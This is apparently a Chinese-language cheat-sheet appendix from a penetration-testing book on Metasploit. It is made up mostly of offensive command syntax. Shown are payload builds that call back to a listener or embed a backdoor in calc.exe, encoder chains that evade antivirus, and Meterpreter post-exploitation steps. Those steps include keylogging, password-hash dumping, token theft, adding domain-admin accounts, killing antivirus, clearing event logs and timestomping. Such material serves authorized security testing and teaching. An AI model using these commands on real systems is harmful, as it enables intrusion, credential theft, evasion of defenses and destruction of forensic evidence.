## 附录 B.速查表

这里是 Metasploit 各种接口和工具中最常用命令和语法的参考。参见 MSFencode Commands 中的 Meterpreter Post Exploitation Commands，了解一些使您生活更轻松的一站式命令。

## MSFconsole 命令

**`show exploits`**

> 显示框架内所有利用程序。

**`show payloads`**

> 显示框架内所有有效载荷。

**`show auxiliary`**

> 显示框架内所有辅助模块。

**`search`** **``*`name`*``**

> 在框架内搜索利用程序或模块。

**`info`**

> 加载有关特定利用程序或模块的信息。

**`use`** **``*`name`*``**

> 加载利用程序或模块（例如：`use windows/smb/psexec`）。

**`LHOST`**

> 您的本地主机 IP 地址，目标可以访问，通常在没有本地网络时是公共 IP 地址。通常用于反向 shell。

**`RHOST`**

> 远程主机或目标。

**`set`** **``*`function`*``**

> 设置特定值（例如，`LHOST`或`RHOST`）。

**`setg`** **``*`function`*``**

> 在全局范围内设置特定值（例如，`LHOST`或`RHOST`）。

**`show options`**

> 显示模块或利用程序可用的选项。

**`show targets`**

> 显示利用程序支持的平台。

**`set target`** **``*`num`*``**

> 如果知道操作系统和服务包，指定特定的目标索引。

**`set payload`** **``*`payload`*``**

> 指定要使用的有效载荷。

**`show advanced`**

> 显示高级选项。

**`set autorunscript migrate -f`**

> 在利用完成后自动迁移到单独的进程。

**`check`**

> 确定目标是否容易受到攻击。

**`exploit`**

> 执行模块或利用程序并攻击目标。

**`exploit -j`**

> 在作业的上下文中运行利用程序。（这将将在后台运行利用程序。）

**`exploit -z`**

> 在成功利用会话后不要与该会话交互。

**`exploit -e`** **``*`encoder`*``**

> 指定要使用的有效载荷编码器（例如：`exploit -e shikata_ga_nai`）。

**`exploit -h`**

> 显示`exploit`命令的帮助信息。

**`sessions -l`**

> 列出可用会话（在处理多个 shell 时使用）。

**`sessions -l -v`**

> 列出所有可用会话并显示详细字段，例如在利用系统时使用了哪种漏洞。

**`sessions -s`** **``*`script`*``**

> 在所有 Meterpreter 实时会话上运行特定的 Meterpreter 脚本。

**`sessions -K`**

> 终止所有实时会话。

**`sessions -c`** **``*`cmd`*``**

> 在所有实时 Meterpreter 会话上执行命令。

**`sessions -u`** **``*`sessionID`*``**

> 将普通 Win32 外壳升级到 Meterpreter 控制台。

**`db_create`** **``*`name`*``**

> 创建用于数据库驱动攻击的数据库（例如：`db_create autopwn`）。

**`db_connect`** **``*`name`*``**

> 创建并连接到用于驱动攻击的数据库（例如：`db_connect autopwn`）。

**`db_nmap`**

> 使用 *nmap* 并将结果放入数据库。（支持正常的 *nmap* 语法，例如 `-sT -v -P0`。）

**`db_autopwn -h`**

> 显示使用 `db_autopwn` 的帮助。

**`db_autopwn -p -r -e`**

> 对找到的所有端口运行 `db_autopwn`，使用反向 shell 并利用所有系统。

**`db_destroy`**

> 删除当前数据库。

**`db_destroy`** **``*`user:password@host:port/database`*``**

> 使用高级选项删除数据库。

## Meterpreter 命令

**`help`**

> 打开 Meterpreter 使用帮助。

**`run`** **``*`scriptname`*``**

> 运行基于 Meterpreter 的脚本；完整列表请查看 *scripts/meterpreter* 目录。

**`sysinfo`**

> 显示受攻击目标上的系统信息。

**`ls`**

> 列出目标上的文件和文件夹。

**`use priv`**

> 加载扩展 Meterpreter 库的权限扩展。

**`ps`**

> 显示所有正在运行的过程以及与每个进程关联的账户。

**`migrate`** **``*`PID`*``**

> 迁移到特定的进程 ID（PID 是从 `ps` 命令中获取的目标进程 ID）。

**`use incognito`**

> 加载 *incognito* 函数。（用于在目标机器上窃取令牌和模拟。）

**`list_tokens -u`**

> 按用户列出目标上的可用令牌。

**`list_tokens -g`**

> 按组列出目标上的可用令牌。

**`impersonate_token DOMAIN_NAME\\USERNAME`**

> 模拟目标上可用的令牌。

**`steal_token`** **``*`PID`*``**

> 窃取给定进程可用的令牌并模拟该令牌。

**`drop_token`**

> 停止模拟当前令牌。

**`getsystem`**

> 通过多个攻击向量尝试提升权限到 SYSTEM 级别访问。

**`shell`**

> 使用所有可用的令牌进入交互式 shell。

**`execute -f cmd.exe -i`**

> 执行 *cmd.exe* 并与之交互。

**`execute -f cmd.exe -i -t`**

> 使用所有可用的令牌执行 *cmd.exe*。

**`execute -f cmd.exe -i -H -t`**

> 使用所有可用的令牌执行 *cmd.exe* 并将其设置为隐藏进程。

**`rev2self`**

> 回退到最初用于攻击目标的用户。

**`reg`** **``*`command`*``**

> 在目标注册表中交互、创建、删除、查询、设置等。

**`setdesktop`** **``*`number`*``**

> 根据登录用户切换到不同的屏幕。

**`screenshot`**

> 捕获目标屏幕的截图。

**`upload`** **``*`file`*``**

> 将文件上传到目标。

**`download`** **``*`file`*``**

> 从目标下载文件。

**`keyscan_start`**

> 在远程目标上开始按键记录。

**`keyscan_dump`**

> 在目标上转储捕获的远程密钥。

**`keyscan_stop`**

> 在远程目标上停止按键记录。

**`getprivs`**

> 在目标上获取尽可能多的权限。

**`uictl enable keyboard/mouse`**

> 控制键盘和/或鼠标。

**`background`**

> 在后台运行当前的 Meterpreter shell。

**`hashdump`**

> 在目标上转储所有哈希值。

**`use sniffer`**

> 加载嗅探模块。

**`sniffer_interfaces`**

> 列出目标上的可用接口。

**`sniffer_dump`** **``*`interfaceID pcapname`*``**

> 在远程目标上开始嗅探。

**`sniffer_start`** **``*`interfaceID packet-buffer`*``**

> 使用特定的数据包缓冲区范围开始嗅探。

**`sniffer_stats`** **``*`interfaceID`*``**

> 从您正在嗅探的接口获取统计信息。

**`sniffer_stop`** **``*`interfaceID`*``**

> 停止嗅探。

**`add_user`** **``*`username password`*``** **`-h`** **``*`ip`*``**

> 在远程目标上添加用户。

**`add_group_user "Domain Admins"`** **``*`username`*``** **`-h`** **``*`ip`*``**

> 在远程目标上将用户名添加到 *Domain Administrators* 组。

**`clearev`**

> 清除目标机器上的事件日志。

**`timestomp`**

> 修改文件属性，例如创建日期（反取证措施）。

**`reboot`**

> 重启目标机器。

## MSFpayload 命令

**`msfpayload -h`**

> 列出可用的有效载荷。

**`msfpayload windows/meterpreter/bind_tcp O`**

> 列出 `windows/meterpreter/bind_tcp` 有效载荷的可用选项（所有这些都可以使用任何有效载荷）。

**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X > payload.exe`**

> 创建一个连接回 192.168.1.5 并在端口 443 的 *reverse_tcp* Meterpreter 有效载荷，并将其保存为名为 *payload.exe* 的 Windows 可移植可执行文件。

**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R > payload.raw`**

> 与上面相同，但以原始格式导出。这将在 *msfencode* 中稍后使用。

**`msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c`**

> 与上面相同，但以 C 格式的 shellcode 导出。

**`msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java`**

> 以 *%u 编码* 的 JavaScript 格式导出。

## MSFencode 命令

**`msfencode -h`**

> 显示 *msfencode* 帮助。

**`msfencode -l`**

> 列出可用的编码器。

**`msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)`**

> 以显示编码缓冲区的格式。

**`msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe`**

> 使用 `shikata_ga_nai` 对 `payload.raw` 进行五次编码，并将其导出到名为 *encoded_payload.exe* 的输出文件。

**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe`**

> 创建一个多编码有效载荷。

**`msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c`**

> 创建纯字母数字的 shellcode，其中 ESI 指向 shellcode；以 C 风格的表示法输出。

## MSFcli 命令

**`msfcli | grep exploit`**

> 仅显示漏洞利用。

**`msfcli | grep exploit/windows`**

> 仅显示 Windows 漏洞利用。

**`msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E`**

> 在 172.16.32.142 上启动 `ms08_067_netapi` 漏洞利用，使用 `bind_tcp` 有效载荷监听端口 443。

## MSF, Ninja, Fu

**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**

> 使用 *calc.exe* 作为后门模板，创建一个连接回 192.168.1.5 端口 443 的反向 Meterpreter 有效载荷。保持应用程序内的执行流程，以便它继续工作，并将 `shikata_ga_nai` 编码的有效载荷输出到 *payload.exe*。

**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe`**

> 使用 *calc.exe* 作为后门模板，创建一个连接回 192.168.1.5 端口 443 的反向 Meterpreter 有效载荷。不保持应用程序内的执行流程，在执行时不会向最终用户提示任何内容。这在您通过浏览器漏洞远程访问时很有用，并且不想让计算器应用程序出现在最终用户面前。同时将 `shikata_ga_nai` 编码的有效载荷输出到 *payload.exe*。

**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E`**

> 以原始格式创建一个 `bind_tcp` Meterpreter 有效载荷，使用 `shikata_ga_nai` 编码七次，以 Windows 便携式可执行文件格式输出，命名为 *payload.exe*，然后让一个多处理器监听以执行它。

## MSFvenom

利用一站式套件 *msfvenom* 创建和编码您的有效载荷：

```
`msfvenom --payload`
windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai
   LHOST=172.16.1.32 LPORT=443 > msf.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
root@bt://opt/framework3/msf3#
```

这条单行命令将创建一个有效载荷，并自动将其生成为可执行格式。

## Meterpreter 后渗透攻击命令

使用 Meterpreter 在基于 Windows 的系统上提升您的权限：

```
meterpreter > `use priv`
meterpreter > `getsystem`
```

从给定的进程 ID 中窃取域管理员令牌，添加域账户，并将其添加到 *Domain Admins* 组：

```
meterpreter > `ps`

meterpreter > `steal_token 1784`
meterpreter > `shell`

C:\Windows\system32>`net user metasploit p@55w0rd /ADD /DOMAIN`
C:\Windows\system32>`net group "Domain Admins" metasploit /ADD /DOMAIN`
```

从 SAM 数据库中转储密码哈希：

```
meterpreter > `use priv`
meterpreter > `getsystem`
meterpreter > `hashdump`
```

* * *

### 注意

在 Win2k8 上，如果您在 `-getsystem` 和 `hashdump` 抛出异常时，可能需要迁移到作为 SYSTEM 运行的进程。

* * *

自动迁移到单独的进程：

```
meterpreter > `run migrate`
```

通过 *killav* Meterpreter 脚本在目标上终止正在运行的防病毒进程：

```
meterpreter > `run killav`
```

在特定进程中捕获目标机器上的按键：

```
meterpreter > `ps`
meterpreter > `migrate 1436`
meterpreter > `keyscan_start`
meterpreter > `keyscan_dump`
meterpreter > `keyscan_stop`
```

使用 Incognito 来模拟管理员：

```
meterpreter > `use incognito`
meterpreter > `list_tokens -u`
meterpreter > `use priv`
meterpreter > `getsystem`
meterpreter > `list_tokens -u`
meterpreter > `impersonate_token IHAZSECURITY\\Administrator`
```

查看受损害目标上的保护机制，显示帮助菜单，禁用 Windows 防火墙，并终止所有发现的反制措施：

```
meterpreter > `run getcountermeasure`
meterpreter > `run getcountermeasure -h`
meterpreter > `run getcountermeasure -d -k`
```

确定受损害的系统是否为虚拟机：

```
meterpreter > `run checkvm`
```

在当前 Meterpreter 控制台会话中进入命令行：

```
meterpreter > `shell`
```

在目标机器上获取远程 GUI（VNC）：

```
meterpreter > `run vnc`
```

将当前运行的 Meterpreter 控制台置于后台：

```
meterpreter > `background`
```

绕过 Windows 用户访问控制：

```
meterpreter > `run post/windows/escalate/bypassuac`
```

在 OS X 系统上转储哈希值：

```
meterpreter > `run post/osx/gather/hashdump`
```

在 Linux 系统上转储哈希值：

```
meterpreter > `run post/linux/gather/hashdump`
```
